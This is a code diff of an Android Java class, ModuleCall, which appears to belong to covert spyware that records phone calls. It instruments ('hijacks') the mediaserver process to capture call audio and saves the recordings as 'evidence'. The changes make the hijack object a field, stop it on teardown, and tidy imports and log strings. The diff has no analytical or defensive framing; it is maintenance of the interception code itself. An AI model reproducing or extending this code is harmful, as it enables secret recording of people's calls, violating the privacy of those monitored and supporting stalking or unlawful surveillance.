@@ -21,8 +21,6 @@ import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.LinkedBlockingQueue;
 import java.util.concurrent.TimeUnit;
 
-import android.app.ActivityManager.RunningAppProcessInfo;
-import android.content.SyncResult;
 import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.FileObserver;
@@ -92,6 +90,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private static BlockingQueue<String> calls;
 	private EncodingTask encodingTask;
 	private CallBack cb;
+	private Instrument hijack;
 
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
 	public static final byte[] MP4_HEADER = new byte[] { 0, 0, 0 };
@@ -169,7 +168,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			cb = new CallBack();
 			cb.register(new InternalCallBack());
 
-			Instrument hijack = new Instrument("mediaserver", AudioEncoder.getAudioStorage());
+			hijack = new Instrument("mediaserver", AudioEncoder.getAudioStorage());
 
 			if (hijack.installHijacker()) {
 				if (Cfg.DEBUG) {
@@ -369,7 +368,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		@Override
 		public int notification(ProcessInfo b) {
-
 			return 0;
 		}
 	}
@@ -409,6 +407,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 			if (observer != null) {
 				observer.stopWatching();
+			}
+			
+			if (hijack != null) {
+				hijack.stopInstrumentation();
 			}
 		}
 	}
@@ -1041,6 +1043,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		// Defensive, saveCallEvidence()/closeCallEvidence() already removes the
 		// file
 		audioEncoder.removeRawFile();
+
 	}
 
 	private void saveAllEvidences(List<Chunk> chunks, Date begin, Date end) {
@@ -1068,6 +1071,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	}
 
 	private boolean updateCallInfo(CallInfo callInfo, boolean end) {
+
 		// RunningAppProcessInfo fore = runningProcesses.getForeground();
 		if (callInfo.valid) {
 			return true;
@@ -1130,7 +1134,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		public <O> void run(O o) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "(run callback): " + o);
+				Check.log(TAG + " (run callback): " + o);
 			}
 		}
 	}
